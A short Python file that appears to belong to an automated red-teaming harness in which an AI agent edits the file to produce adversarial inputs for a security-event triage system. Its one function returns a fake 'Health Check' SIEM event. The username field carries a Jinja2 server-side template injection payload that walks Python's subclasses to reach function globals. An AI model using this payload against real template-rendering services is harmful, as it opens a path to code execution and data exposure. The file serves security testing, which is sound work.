"""
MUTABLE FILE — The agent modifies this to generate adversarial payloads.
"""


def generate_payload() -> dict:
    # Experiment 54: Jinja2 expression {{ ''.__class__.__mro__[1].__subclasses__() }}
    # Template injection that enumerates Python classes
    return {
        "task_type": "system_health",
        "severity": "info",
        "siem_event": {
            "title": "Health Check",
            "source_ip": "10.0.0.1",
            "username": "{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__}}",
            "hostname": "srv-01",
            "rule_name": "HealthCheck",
            "raw_log": "Health check completed. All systems nominal. Source=10.0.0.1",
        },
    }
